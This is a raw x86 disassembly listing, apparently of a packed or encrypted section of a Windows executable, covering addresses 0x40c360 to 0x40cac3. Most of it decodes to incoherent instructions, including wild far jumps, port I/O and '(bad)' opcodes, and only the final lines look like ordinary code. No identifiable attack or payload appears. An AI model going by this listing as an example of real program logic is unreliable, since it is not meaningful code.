  40c360:	pop    esp
  40c361:	retf   
  40c362:	icebp  
  40c363:	mov    dl,0x89
  40c365:	mov    dl,0x2f
  40c367:	sbb    al,0xe4
  40c369:	push   esp
  40c36a:	fild   WORD PTR [eax]
  40c36c:	xchg   esp,eax
  40c36d:	rcl    DWORD PTR [edx+0x7e208ce],1
  40c373:	and    DWORD PTR [edi-0x5e96d49b],ecx
  40c379:	and    eax,0x1fdef5a3
  40c37e:	ins    BYTE PTR es:[edi],dx
  40c37f:	not    DWORD PTR [ebp+0x70]
  40c382:	add    esi,DWORD PTR [ebx-0x7a]
  40c385:	xchg   esp,eax
  40c386:	add    DWORD PTR [ebx-0x10],esp
  40c389:	das    
  40c38a:	outs   dx,DWORD PTR ds:[esi]
  40c38b:	jb     0x40c34f
  40c38d:	(bad)  
  40c38e:	mov    esi,0x4714d61c
  40c393:	jns    0x40c36e
  40c395:	cmc    
  40c396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c397:	(bad)  
  40c398:	adc    BYTE PTR [ebx+edi*8+0x6667b567],cl
  40c39f:	adc    esp,ebp
  40c3a1:	cmovp  esi,DWORD PTR [edx]
  40c3a4:	out    0xeb,al
  40c3a6:	xchg   esp,eax
  40c3a7:	cmp    BYTE PTR [ecx-0x29],bh
  40c3aa:	sar    DWORD PTR [edx],cl
  40c3ac:	std    
  40c3ad:	and    DWORD PTR [esi],eax
  40c3af:	sub    eax,0x94874be
  40c3b4:	jmp    0xe5d2b972
  40c3b9:	daa    
  40c3ba:	mov    dh,0xb3
  40c3bc:	enter  0x9c2d,0x12
  40c3c0:	cwde   
  40c3c1:	mov    ebp,0xf38265a6
  40c3c6:	comiss xmm0,xmm4
  40c3c9:	mov    ebp,ecx
  40c3cb:	cmp    edi,DWORD PTR [ecx-0x39]
  40c3ce:	daa    
  40c3cf:	pusha  
  40c3d0:	pop    esp
  40c3d1:	cmp    edi,DWORD PTR ds:0x1c809f7c
  40c3d7:	xchg   ebp,eax
  40c3d8:	jnp    0x40c38e
  40c3da:	retf   
  40c3db:	or     ecx,DWORD PTR [ecx+0x5055027c]
  40c3e1:	fwait
  40c3e2:	ret    0xcf84
  40c3e5:	xchg   esi,eax
  40c3e6:	mov    ch,0x24
  40c3e8:	call   0x1ab3d1ea
  40c3ed:	jmp    0x40c387
  40c3ef:	adc    BYTE PTR ds:0xd7afdbf3,bh
  40c3f5:	loop   0x40c395
  40c3f7:	loope  0x40c43e
  40c3f9:	sub    DWORD PTR [edx+0x36],edx
  40c3fc:	push   esp
  40c3fd:	ret    
  40c3fe:	mov    ds,WORD PTR [edi]
  40c400:	jno    0x40c3ed
  40c402:	(bad)  
  40c403:	fnstcw WORD PTR [esi]
  40c405:	push   ss
  40c406:	in     al,0xd4
  40c408:	dec    eax
  40c409:	fs js  0x40c47f
  40c40c:	rcr    DWORD PTR [edi-0x50e619e8],1
  40c412:	test   al,0x63
  40c414:	data16 fidivr WORD PTR [ebp-0x5f77bf1d]
  40c41b:	sub    BYTE PTR [ebp+0x3c],al
  40c41e:	or     BYTE PTR [ecx-0x4c],bh
  40c421:	lods   al,BYTE PTR ds:[esi]
  40c422:	imul   edx,DWORD PTR [esi],0x5f
  40c425:	add    eax,eax
  40c427:	dec    eax
  40c428:	sbb    ah,BYTE PTR [edx+0x337239b3]
  40c42e:	pop    eax
  40c42f:	ret    0x6373
  40c432:	sub    eax,0xd8721dd3
  40c437:	(bad)  
  40c438:	stos   BYTE PTR es:[edi],al
  40c439:	push   ss
  40c43a:	test   DWORD PTR [esi],eax
  40c43c:	cmp    BYTE PTR [edi-0x79],dl
  40c43f:	inc    ecx
  40c440:	retf   0x7d32
  40c443:	sub    cl,dl
  40c445:	or     eax,0x8ec5f3db
  40c44a:	mov    edx,0xad440988
  40c44f:	retf   
  40c450:	xchg   BYTE PTR [esi+esi*1-0x76e25890],al
  40c457:	ins    BYTE PTR es:[edi],dx
  40c458:	out    dx,eax
  40c459:	fdivr  DWORD PTR ds:0x1520b83f
  40c45f:	dec    edx
  40c460:	pop    ecx
  40c461:	adc    eax,0x75db78ec
  40c466:	icebp  
  40c467:	mov    eax,ds:0x8eb8855e
  40c46c:	gs mov dh,BYTE PTR fs:[edi+ebx*4-0x17]
  40c472:	ret    0x3906
  40c475:	mov    DWORD PTR [ebx],ebx
  40c477:	movhps xmm7,QWORD PTR [eax]
  40c47a:	adc    al,0xa3
  40c47c:	mov    ch,0x24
  40c47e:	and    BYTE PTR [edi],dh
  40c480:	cmp    DWORD PTR [ebp+0x21205298],edx
  40c486:	je     0x40c41c
  40c488:	adc    ecx,DWORD PTR [eax]
  40c48a:	jp     0x40c4fd
  40c48c:	inc    ecx
  40c48d:	xor    esi,ebp
  40c48f:	ret    0x6b4c
  40c492:	ss ins DWORD PTR es:[edi],dx
  40c494:	sub    eax,0x24e67cbb
  40c499:	je     0x40c4ec
  40c49b:	mov    ecx,0x737b8a3f
  40c4a0:	sub    al,0x1d
  40c4a2:	ds push edi
  40c4a4:	clc    
  40c4a5:	pop    ebx
  40c4a6:	ins    DWORD PTR es:[edi],dx
  40c4a7:	jmp    0x40c482
  40c4a9:	add    BYTE PTR [edi+0x7c],ch
  40c4ac:	push   cs
  40c4ad:	enter  0x803f,0x6
  40c4b1:	jg     0x40c50a
  40c4b3:	call   0xb425:0xac0eff6f
  40c4ba:	add    al,0xdb
  40c4bc:	pop    ecx
  40c4bd:	retf   0x16b
  40c4c0:	push   eax
  40c4c1:	pop    edi
  40c4c2:	sti    
  40c4c3:	sahf   
  40c4c4:	repz mov al,ds:0xbe576c3f
  40c4ca:	imul   esi,DWORD PTR ds:0xd68bfdad,0xf197e13b
  40c4d4:	xchg   edx,eax
  40c4d5:	and    eax,0x601020ee
  40c4da:	stc    
  40c4db:	lods   eax,DWORD PTR ds:[esi]
  40c4dc:	out    0x2f,al
  40c4de:	gs jmp 0x87729435
  40c4e4:	cld    
  40c4e5:	dec    esp
  40c4e6:	cmp    al,0x39
  40c4e8:	les    edi,FWORD PTR [esi-0x34]
  40c4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ec:	mov    cl,BYTE PTR [edx+0x79e1ab86]
  40c4f2:	stos   DWORD PTR es:[edi],eax
  40c4f3:	pop    ds
  40c4f4:	mov    bl,0x7f
  40c4f6:	in     al,0x73
  40c4f8:	mov    BYTE PTR [ebx+0x52],dh
  40c4fb:	sub    BYTE PTR [esi+0x7ea5601c],dl
  40c501:	push   cs
  40c502:	cmp    eax,0xf5788a70
  40c507:	out    0x90,al
  40c509:	jle    0x40c4a9
  40c50b:	xchg   ebx,eax
  40c50c:	adc    al,0x85
  40c50e:	imul   BYTE PTR [eax]
  40c510:	mov    bl,0x28
  40c512:	imul   edi,DWORD PTR [eax-0x133981bc],0xffffffb9
  40c519:	int    0xf8
  40c51b:	dec    ebp
  40c51c:	fild   DWORD PTR [ebx-0x677ab2ac]
  40c522:	inc    ebx
  40c523:	mov    eax,0x8b38db7b
  40c528:	loope  0x40c55f
  40c52a:	push   eax
  40c52b:	imul   edx,DWORD PTR [esi+0x1b8c480d],0x8324f406
  40c535:	hlt    
  40c536:	cs jmp 0x24f3:0xadc263d7
  40c53e:	jb     0x40c506
  40c540:	cmp    al,0x42
  40c542:	rcl    dh,0x86
  40c545:	in     eax,dx
  40c546:	jno    0x40c574
  40c548:	add    ch,0xd3
  40c54b:	gs pop ebp
  40c54d:	push   0xc6d4d28d
  40c552:	adc    BYTE PTR [edi+edi*8],0x69
  40c556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c557:	test   edx,edi
  40c559:	(bad)
  40c55c:	jo     0x40c544
  40c55e:	xchg   esp,eax
  40c55f:	mov    esi,0xfbbfdd04
  40c564:	(bad)  
  40c565:	fs pop eax
  40c567:	mov    esp,DWORD PTR [edx+0x27]
  40c56a:	cs aad 0x5d
  40c56d:	xor    DWORD PTR [ebx+0x48fdd156],ecx
  40c573:	xor    DWORD PTR [eax+0x24],ecx
  40c576:	loopne 0x40c558
  40c578:	jg     0x40c536
  40c57a:	mov    edi,0x9b6cbf75
  40c57f:	mov    BYTE PTR [ebp+0x13],cl
  40c582:	mov    ?,ebp
  40c584:	fs sub eax,edx
  40c587:	push   0xffffff95
  40c589:	imul   edx,esp,0xffffffda
  40c58c:	inc    esi
  40c58d:	push   0x7d
  40c58f:	xlat   BYTE PTR ds:[ebx]
  40c590:	cld    
  40c591:	ret    
  40c592:	repz mov ebx,0xa2856c98
  40c598:	sar    BYTE PTR [ebx+0x5b],0x63
  40c59c:	inc    ebx
  40c59d:	ret    0x2cc4
  40c5a0:	jno    0x40c576
  40c5a2:	gs jg  0x40c60d
  40c5a5:	sub    DWORD PTR [ecx],0xffffffe6
  40c5a8:	popf   
  40c5a9:	jnp    0x40c60e
  40c5ab:	aam    0xb1
  40c5ad:	jp     0x40c57e
  40c5af:	mov    esi,DWORD PTR [ebx+0x21]
  40c5b2:	fld    DWORD PTR es:[edx-0x4b]
  40c5b6:	ret    0x4cea
  40c5b9:	push   ebx
  40c5ba:	lds    eax,FWORD PTR ds:0xf910b338
  40c5c0:	jnp    0x40c5ce
  40c5c2:	std    
  40c5c3:	push   esp
  40c5c4:	or     eax,0xc24a43b6
  40c5c9:	js     0x40c568
  40c5cb:	lods   eax,DWORD PTR ds:[esi]
  40c5cc:	cmp    BYTE PTR [edx-0x48],bl
  40c5cf:	and    dh,BYTE PTR [ecx+0x345c00a3]
  40c5d5:	and    ch,BYTE PTR [ebp+ebp*2-0x3140a2e0]
  40c5dc:	leave  
  40c5dd:	jg     0x40c5f7
  40c5df:	add    al,0x89
  40c5e1:	stos   DWORD PTR es:[edi],eax
  40c5e2:	and    al,ch
  40c5e4:	dec    edx
  40c5e5:	hlt    
  40c5e6:	int3   
  40c5e7:	cmp    ch,BYTE PTR [esi+0x6a]
  40c5ea:	adc    eax,0x34edb7cf
  40c5ef:	or     BYTE PTR [ecx-0x63de8192],ah
  40c5f5:	add    al,al
  40c5f7:	cli    
  40c5f8:	mov    eax,0x39de846b
  40c5fd:	mov    dl,0xa0
  40c5ff:	mov    al,ds:0x7b4685b0
  40c604:	lock xor BYTE PTR [esi+0x55],0x99
  40c609:	imul   ecx,DWORD PTR [eax],0xaa2ba3c5
  40c60f:	sbb    dl,dl
  40c611:	lods   eax,DWORD PTR ds:[esi]
  40c612:	sti    
  40c613:	aas    
  40c614:	add    BYTE PTR [esi],0x6c
  40c617:	pushf  
  40c618:	push   0xffffffde
  40c61a:	aad    0xe0
  40c61c:	repnz cld 
  40c61e:	repnz pop esi
  40c620:	iret   
  40c621:	inc    ecx
  40c622:	mov    ds:0x2d707a02,al
  40c627:	loop   0x40c665
  40c629:	cmc    
  40c62a:	mov    ch,0x4b
  40c62c:	std    
  40c62d:	cld    
  40c62e:	das    
  40c62f:	fwait
  40c630:	lahf   
  40c631:	lock inc edx
  40c633:	sbb    al,0x96
  40c635:	and    BYTE PTR [edi],bl
  40c637:	mov    esi,0xfd2142
  40c63c:	mov    edi,0xed80bef6
  40c641:	inc    eax
  40c642:	jle    0x40c64b
  40c644:	out    0x6a,al
  40c646:	xor    esp,DWORD PTR [eax-0x72]
  40c649:	jle    0x40c5ce
  40c64b:	mov    bl,dl
  40c64d:	jmp    0x97c0ec02
  40c652:	adc    DWORD PTR [ebx],0xa9673289
  40c658:	enter  0xebcb,0xf2
  40c65c:	stos   DWORD PTR es:[edi],eax
  40c65d:	fld    QWORD PTR [esi]
  40c65f:	adc    al,0x6f
  40c661:	int3   
  40c662:	aam    0x5
  40c664:	es pop eax
  40c666:	dec    ebp
  40c667:	pop    esi
  40c668:	daa    
  40c669:	clc    
  40c66a:	std    
  40c66b:	pushf  
  40c66c:	(bad)  
  40c66d:	mov    dl,0x69
  40c66f:	scas   eax,DWORD PTR es:[edi]
  40c670:	inc    ecx
  40c671:	and    al,0x5d
  40c673:	or     al,0xb4
  40c675:	scas   eax,DWORD PTR es:[edi]
  40c676:	mov    bl,0x3e
  40c678:	mov    ebp,0xe291c6db
  40c67d:	mov    DWORD PTR ds:0x31025e41,ebx
  40c683:	or     al,0x4d
  40c685:	cmp    bh,BYTE PTR [edi]
  40c687:	jle    0x40c68b
  40c689:	push   esi
  40c68a:	mov    ecx,0x2f6dfb44
  40c68f:	pop    edx
  40c690:	push   esi
  40c691:	(bad)  
  40c692:	sbb    eax,0x4aa21f4
  40c697:	push   eax
  40c698:	jmp    0x40c67e
  40c69a:	(bad)  
  40c69b:	pushf  
  40c69c:	dec    edx
  40c69d:	mov    BYTE PTR [ebx+eax*4+0xf],cl
  40c6a1:	push   edi
  40c6a2:	popa   
  40c6a3:	repnz addr16 xor eax,0x5d0e6391
  40c6aa:	mov    bl,BYTE PTR [eax-0x5a]
  40c6ad:	mov    al,ds:0xe0fa34d1
  40c6b2:	sar    BYTE PTR [ebp+0x5e],cl
  40c6b5:	in     al,dx
  40c6b6:	xchg   edx,eax
  40c6b7:	loope  0x40c6fc
  40c6b9:	shr    BYTE PTR [ebp+eax*1+0x78ce6868],1
  40c6c0:	push   0x428b9bb3
  40c6c5:	mov    esp,0xe8177dd9
  40c6ca:	int3   
  40c6cb:	in     eax,0x52
  40c6cd:	rcl    ecx,0xa4
  40c6d0:	push   ds
  40c6d1:	popf   
  40c6d2:	ss push esp
  40c6d4:	adc    al,0x77
  40c6d6:	loop   0x40c6df
  40c6d8:	sbb    eax,0xf55b9923
  40c6dd:	call   0xe622f53c
  40c6e2:	adc    BYTE PTR [edx],al
  40c6e4:	inc    ebp
  40c6e5:	sub    DWORD PTR [edx+0x6b],eax
  40c6e8:	lods   eax,DWORD PTR ds:[esi]
  40c6e9:	mov    ds:0x666d86ca,al
  40c6ee:	fsub   QWORD PTR [ebp+0x19]
  40c6f1:	or     eax,0x6c7d1520
  40c6f6:	lods   eax,DWORD PTR ds:[esi]
  40c6f7:	or     edi,edx
  40c6f9:	inc    esp
  40c6fa:	adc    BYTE PTR [eax+esi*1],al
  40c6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6fe:	push   ds
  40c6ff:	daa    
  40c700:	push   0x65
  40c702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c703:	dec    eax
  40c704:	adc    DWORD PTR [eax+0x710e7d09],edx
  40c70a:	mov    cl,0xc9
  40c70c:	lods   al,BYTE PTR ds:[esi]
  40c70d:	jg     0x40c70f
  40c70f:	data16 sub BYTE PTR [eax],al
  40c712:	in     al,0xd0
  40c714:	add    ax,0xd1cb
  40c718:	jmp    0x405f:0x7ade8cd9
  40c71f:	test   al,0xba
  40c721:	inc    DWORD PTR [eax+0x1951a403]
  40c727:	xor    eax,0x37d1961a
  40c72c:	mov    ch,BYTE PTR [edx+0x7d]
  40c72f:	adc    al,0xc9
  40c731:	scas   eax,DWORD PTR es:[edi]
  40c732:	and    ebx,DWORD PTR [esi+0x4c4557b4]
  40c738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c739:	mov    ecx,0xebb16bb4
  40c73e:	int3   
  40c73f:	jns    0x40c71c
  40c741:	sub    al,0x13
  40c743:	add    al,0xe9
  40c745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c746:	push   ebx
  40c747:	stos   BYTE PTR es:[edi],al
  40c748:	cmp    bl,BYTE PTR [esi-0x36060bc6]
  40c74e:	jne    0x40c799
  40c750:	and    DWORD PTR [ebp-0x3c009dd1],0xffffffff
  40c757:	xlat   BYTE PTR ds:[ebx]
  40c758:	lock test al,0x72
  40c75b:	mov    dh,BYTE PTR [esi+0x20]
  40c75e:	fcom   QWORD PTR [edx]
  40c760:	add    al,0x4
  40c762:	xchg   DWORD PTR [esi+0x66],esp
  40c765:	sbb    al,0xf1
  40c767:	ins    DWORD PTR es:[edi],dx
  40c768:	cmp    ah,BYTE PTR [edi-0x87d7f04]
  40c76e:	or     DWORD PTR [edx+0x3a5b5a78],ecx
  40c774:	pop    ecx
  40c775:	fs cmp al,0x5
  40c778:	or     BYTE PTR [eax-0x583e1cf1],al
  40c77e:	xlat   BYTE PTR ds:[ebx]
  40c77f:	inc    eax
  40c780:	and    DWORD PTR [ebx+0x27],edx
  40c783:	push   esi
  40c784:	mov    al,ds:0xe7bd12f9
  40c789:	sar    DWORD PTR [si+0x7fb0],1
  40c78e:	mov    al,ds:0xf0f3fe08
  40c793:	and    eax,0xc8e25621
  40c798:	mov    ah,ah
  40c79a:	push   0x6f
  40c79c:	into   
  40c79d:	inc    esi
  40c79e:	js     0x40c75f
  40c7a0:	jne    0x40c768
  40c7a2:	push   ebp
  40c7a3:	push   ss
  40c7a4:	ror    DWORD PTR [ebx],1
  40c7a6:	js     0x40c79e
  40c7a8:	or     eax,0x60b086f3
  40c7ad:	test   ax,0x719c
  40c7b1:	xor    DWORD PTR [esi-0xc3d5de9],edx
  40c7b7:	sub    DWORD PTR [esi+0x503dfa02],ecx
  40c7bd:	mov    esi,0x5aa61e44
  40c7c2:	pop    esi
  40c7c3:	inc    esp
  40c7c4:	mov    bl,0x43
  40c7c6:	add    ecx,DWORD PTR [ecx-0x623d1630]
  40c7cc:	jne    0x40c7ca
  40c7ce:	or     al,0x80
  40c7d0:	cmp    al,0x3b
  40c7d2:	test   eax,0x839eaab2
  40c7d7:	push   eax
  40c7d8:	xor    al,0x55
  40c7da:	and    eax,0x4f608c33
  40c7df:	(bad)  
  40c7e0:	cmp    ah,dl
  40c7e2:	mov    eax,0x2d6bd4e4
  40c7e7:	add    BYTE PTR [esi],cl
  40c7e9:	push   eax
  40c7ea:	xchg   dh,dl
  40c7ec:	inc    esi
  40c7ed:	sub    BYTE PTR fs:0xc53ba9c6,dl
  40c7f4:	adc    cl,BYTE PTR [eax]
  40c7f6:	mov    edi,0x2f421fe5
  40c7fb:	jmp    0x40c82b
  40c7fd:	repz ja 0x40c7de
  40c800:	adc    ah,BYTE PTR [esi-0x4f987ff9]
  40c806:	ror    ah,1
  40c808:	pop    ecx
  40c809:	scas   eax,DWORD PTR es:[edi]
  40c80a:	mov    ds:0x9156d893,eax
  40c80f:	xor    DWORD PTR [ecx+0xbb7ebad],ebp
  40c815:	mov    edx,0x6e604dd2
  40c81a:	out    0x95,eax
  40c81c:	jnp    0x40c7ee
  40c81e:	mov    bh,dh
  40c820:	rcl    BYTE PTR [ecx-0x1b],cl
  40c823:	mov    eax,0xc6847c12
  40c828:	sbb    eax,0x1491efbc
  40c82d:	push   eax
  40c82e:	outs   dx,DWORD PTR ds:[esi]
  40c82f:	sbb    al,0xe5
  40c831:	pop    esp
  40c832:	inc    ebx
  40c833:	stos   BYTE PTR es:[edi],al
  40c834:	mov    esi,0xb302fb7a
  40c839:	pop    esp
  40c83a:	pop    esp
  40c83b:	adc    BYTE PTR [edi-0x20],dh
  40c83e:	pusha  
  40c83f:	test   BYTE PTR [ebx+0x13],cl
  40c842:	popf   
  40c843:	int3   
  40c844:	sub    BYTE PTR [edx+eax*4+0xd],bl
  40c848:	fistp  QWORD PTR [ecx-0x5d]
  40c84b:	mov    bl,0x1c
  40c84d:	ret    0x98d6
  40c850:	bound  ecx,QWORD PTR [esi]
  40c852:	in     eax,0x59
  40c854:	arpl   di,bp
  40c856:	jbe    0x40c81e
  40c858:	ror    BYTE PTR [edi-0x14bd73ee],cl
  40c85e:	les    ecx,FWORD PTR [edi-0x49b2d1e2]
  40c864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c865:	sbb    DWORD PTR [edi],eax
  40c867:	mov    bl,BYTE PTR [ebp+0x9]
  40c86a:	mov    esi,0x47680e34
  40c86f:	push   ebx
  40c870:	fstp   TBYTE PTR [ebp-0x4c]
  40c873:	mov    ah,0x46
  40c875:	addr16 push cs
  40c877:	jbe    0x40c8af
  40c879:	sub    al,0x3c
  40c87b:	adc    BYTE PTR [eax],0x6e
  40c87e:	stc    
  40c87f:	in     al,dx
  40c880:	dec    ecx
  40c881:	adc    al,0xcc
  40c883:	or     ah,al
  40c885:	inc    ecx
  40c886:	push   ss
  40c887:	retf   
  40c888:	(bad)  
  40c889:	push   esi
  40c88a:	ror    esi,cl
  40c88c:	mov    ebp,0xe97ea14a
  40c891:	xor    al,0x7
  40c893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c894:	pop    ds
  40c895:	outs   dx,DWORD PTR ds:[esi]
  40c896:	adc    BYTE PTR [edi+0x54],bl
  40c899:	jp     0x40c850
  40c89b:	popa   
  40c89c:	mov    ebx,0xd2b9bdc5
  40c8a1:	mov    ?,ebx
  40c8a3:	add    al,0x44
  40c8a5:	add    edx,ecx
  40c8a7:	pop    ecx
  40c8a8:	ror    BYTE PTR [ebp-0x414cb76],1
  40c8ae:	repz and esp,DWORD PTR [eax]
  40c8b1:	sti    
  40c8b2:	dec    ebx
  40c8b3:	or     dh,BYTE PTR [eax]
  40c8b5:	ret    
  40c8b6:	mov    ch,0xee
  40c8b8:	jmp    0x88501e8e
  40c8bd:	pop    esi
  40c8be:	cmp    dh,cl
  40c8c0:	fcom   QWORD PTR [edx+0x300341e]
  40c8c6:	add    edx,ebp
  40c8c8:	and    ch,BYTE PTR [ebp+0x70]
  40c8cb:	into   
  40c8cc:	adc    eax,DWORD PTR ss:[edx+0x21e9ac14]
  40c8d3:	in     al,dx
  40c8d4:	jle    0x40c8ce
  40c8d6:	or     DWORD PTR [edi],ebx
  40c8d8:	lahf   
  40c8d9:	push   esi
  40c8da:	icebp  
  40c8db:	inc    edi
  40c8dc:	xchg   esi,eax
  40c8dd:	pop    ecx
  40c8de:	inc    eax
  40c8df:	pop    ds
  40c8e0:	jo     0x40c891
  40c8e2:	inc    ebx
  40c8e3:	push   edx
  40c8e4:	jbe    0x40c89d
  40c8e6:	xchg   edx,eax
  40c8e7:	xchg   ecx,eax
  40c8e8:	or     eax,0x2dc969d0
  40c8ed:	popa   
  40c8ee:	push   es
  40c8ef:	jnp    0x40c93b
  40c8f1:	imul   esp,esp,0x77
  40c8f4:	adc    esp,DWORD PTR [ebx-0x5a3d7219]
  40c8fa:	pop    esi
  40c8fb:	cmp    ebp,ecx
  40c8fd:	les    edx,FWORD PTR [edx+0x3be24208]
  40c903:	loope  0x40c8b8
  40c905:	xor    eax,0x50e7715f
  40c90a:	out    0x42,eax
  40c90c:	xor    BYTE PTR [edi-0x7a],bl
  40c90f:	inc    esp
  40c910:	ret    0xd641
  40c913:	pop    edi
  40c914:	out    dx,eax
  40c915:	ror    DWORD PTR [eax],cl
  40c917:	loopne 0x40c92f
  40c919:	ds call 0x6fda:0xf5786069
  40c921:	out    0x32,eax
  40c923:	adc    esi,DWORD PTR [ebp-0xf]
  40c926:	pop    esp
  40c927:	out    0x9c,eax
  40c929:	outs   dx,BYTE PTR ds:[esi]
  40c92a:	sub    ebp,DWORD PTR [ebx+0x24]
  40c92d:	mov    ecx,0x1b834afb
  40c932:	pop    ebp
  40c933:	fs nop
  40c935:	inc    ebp
  40c936:	lea    esp,[edx-0x6e367c63]
  40c93c:	lds    esi,FWORD PTR [esi-0x5]
  40c93f:	push   0x26092abc
  40c944:	aad    0x3
  40c946:	inc    esi
  40c947:	cwde   
  40c948:	jns    0x40c981
  40c94a:	xor    al,0x3
  40c94c:	arpl   WORD PTR [ebx-0x7e],bp
  40c94f:	jnp    0x40c956
  40c951:	(bad)  
  40c952:	lea    eax,[eax-0x2f]
  40c955:	sbb    eax,0x87edefb5
  40c95a:	mov    ch,BYTE PTR [edi+0x25a829c9]
  40c960:	mov    bh,0x50
  40c962:	outs   dx,DWORD PTR ds:[esi]
  40c963:	idiv   BYTE PTR [edi-0x70c17134]
  40c969:	icebp  
  40c96a:	mov    esp,0xfbd4f9b7
  40c96f:	lock shr dl,cl
  40c972:	sar    al,0x34
  40c975:	ret    0xc5ce
  40c978:	cmp    esi,edx
  40c97a:	or     eax,ebp
  40c97c:	push   cs
  40c97d:	aam    0x57
  40c97f:	xor    ah,BYTE PTR [edi]
  40c981:	cs daa 
  40c983:	jl     0x40c9cb
  40c985:	cmp    al,0x5d
  40c987:	sub    BYTE PTR [edi],cl
  40c989:	inc    ebp
  40c98a:	lock gs dec ebx
  40c98d:	cmp    bh,bh
  40c98f:	popf   
  40c990:	out    dx,al
  40c991:	mul    DWORD PTR [esi]
  40c993:	retf   0x6114
  40c996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c997:	push   es
  40c998:	popf   
  40c999:	outs   dx,DWORD PTR ds:[esi]
  40c99a:	mov    eax,DWORD PTR [edi+0x1081582]
  40c9a0:	push   esi
  40c9a1:	cmp    BYTE PTR [edi-0x6],dl
  40c9a4:	js     0x40c999
  40c9a6:	dec    ebx
  40c9a7:	das    
  40c9a8:	inc    edi
  40c9a9:	dec    esi
  40c9aa:	jns    0x40c97b
  40c9ac:	pop    ecx
  40c9ad:	push   eax
  40c9ae:	pop    edi
  40c9af:	test   BYTE PTR [ecx],cl
  40c9b1:	mov    ebp,0x806b950d
  40c9b6:	stos   DWORD PTR es:[edi],eax
  40c9b7:	call   0x1dbe317e
  40c9bc:	in     al,0xa4
  40c9be:	hlt    
  40c9bf:	icebp  
  40c9c0:	jl     0x40c97d
  40c9c2:	jmp    0x40ca31
  40c9c4:	adc    ebp,DWORD PTR [ebp+0x41b7a49f]
  40c9ca:	mov    dl,0xbd
  40c9cc:	push   edi
  40c9cd:	pop    edi
  40c9ce:	sub    cl,BYTE PTR [ebx]
  40c9d0:	and    BYTE PTR [edx-0x44ad163c],bl
  40c9d6:	jnp    0x40c9c7
  40c9d8:	imul   ecx,DWORD PTR [edi+0x1cec5a6f],0x1a
  40c9df:	push   es
  40c9e0:	je     0x40ca4d
  40c9e2:	in     al,dx
  40c9e3:	pop    eax
  40c9e4:	mov    dl,0x56
  40c9e6:	punpcklbw mm1,mm6
  40c9e9:	mov    eax,DWORD PTR [ebp+0x2d]
  40c9ec:	push   es
  40c9ed:	rcr    BYTE PTR [ebx+0x1fa90b3a],0xe9
  40c9f4:	fsub   st(4),st
  40c9f6:	mov    ds,WORD PTR [ebp-0x69b487ba]
  40c9fc:	out    0xe6,eax
  40c9fe:	push   0x48
  40ca00:	push   0x253e41ec
  40ca05:	jg     0x40c9a5
  40ca07:	repz imul eax,edx,0x228a1d5e
  40ca0e:	dec    eax
  40ca0f:	dec    esp
  40ca10:	mov    bl,0x47
  40ca12:	adc    cl,al
  40ca14:	push   edi
  40ca15:	and    al,0xdd
  40ca17:	xchg   ecx,eax
  40ca18:	in     al,dx
  40ca19:	dec    edx
  40ca1a:	inc    edi
  40ca1b:	and    dh,BYTE PTR [ecx]
  40ca1d:	xor    ah,BYTE PTR [eax]
  40ca1f:	add    DWORD PTR cs:[edx],esi
  40ca22:	or     BYTE PTR fs:0x9f2266c7,bl
  40ca29:	add    bh,cl
  40ca2b:	push   esp
  40ca2c:	aam    0xa0
  40ca2e:	ja     0x40ca6f
  40ca30:	repnz pop esi
  40ca32:	push   eax
  40ca33:	adc    DWORD PTR [ebx],edx
  40ca35:	jmp    0x40ca77
  40ca37:	sub    ebx,esp
  40ca39:	jno    0x40ca5c
  40ca3b:	outs   dx,BYTE PTR ds:[esi]
  40ca3c:	or     ecx,esi
  40ca3e:	lods   eax,DWORD PTR ds:[esi]
  40ca3f:	jge    0x40ca07
  40ca41:	jno    0x40ca35
  40ca43:	or     bl,al
  40ca45:	int3   
  40ca46:	sti    
  40ca47:	pop    esi
  40ca48:	ret    
  40ca49:	fcmove st,st(5)
  40ca4b:	loope  0x40ca55
  40ca4d:	icebp  
  40ca4e:	(bad)  
  40ca4f:	sahf   
  40ca50:	ds push ecx
  40ca52:	cmc    
  40ca53:	fidiv  WORD PTR [ebp+0x31]
  40ca56:	cmp    DWORD PTR [edx],ebp
  40ca58:	cld    
  40ca59:	inc    ebx
  40ca5a:	test   BYTE PTR [ebp+0x3284999f],ch
  40ca60:	mov    ebx,DWORD PTR [edx+ebx*8-0x736119a7]
  40ca67:	inc    esp
  40ca68:	loopne 0x40c9f3
  40ca6a:	inc    edi
  40ca6b:	ret    
  40ca6c:	mov    eax,0xbee1c908
  40ca71:	mov    ah,0xcd
  40ca73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca74:	icebp  
  40ca75:	adc    esi,ebp
  40ca77:	(bad)  
  40ca78:	jle    0x40caf4
  40ca7a:	mov    bl,BYTE PTR [edi+0x3f4c6f7f]
  40ca80:	mov    ebx,0x583960f2
  40ca85:	adc    ebp,DWORD PTR [ebp-0x6ba2e078]
  40ca8b:	cmp    BYTE PTR cs:[esi-0x78],dh
  40ca8f:	inc    esp
  40ca90:	add    DWORD PTR [eax],ebx
  40ca92:	adc    al,0x45
  40ca94:	ins    BYTE PTR es:[edi],dx
  40ca95:	jnp    0x40cada
  40ca97:	ja     0x40ca89
  40ca99:	pop    edx
  40ca9a:	jl     0x40ca23
  40ca9c:	sub    eax,0xc2d21a10
  40caa1:	outs   dx,DWORD PTR ds:[esi]
  40caa2:	enter  0x23cb,0x3
  40caa6:	mov    cl,0xca
  40caa8:	not    BYTE PTR [eax]
  40caaa:	pop    ds
  40caab:	jge    0x40ca64
  40caad:	scas   eax,DWORD PTR es:[edi]
  40caae:	add    DWORD PTR [eax],ebx
  40cab0:	mov    eax,DWORD PTR [ebp-0x4]
  40cab3:	mov    edi,DWORD PTR [ebp-0x8]
  40cab6:	add    edi,DWORD PTR [eax]
  40cab8:	mov    DWORD PTR [ebp-0x8],edi
  40cabb:	mov    eax,DWORD PTR [ebp+0xc]
  40cabe:	mov    edi,DWORD PTR [ebp+0xc]
  40cac1:	xor    edi,ecx
  40cac3:	xor    eax,ecx
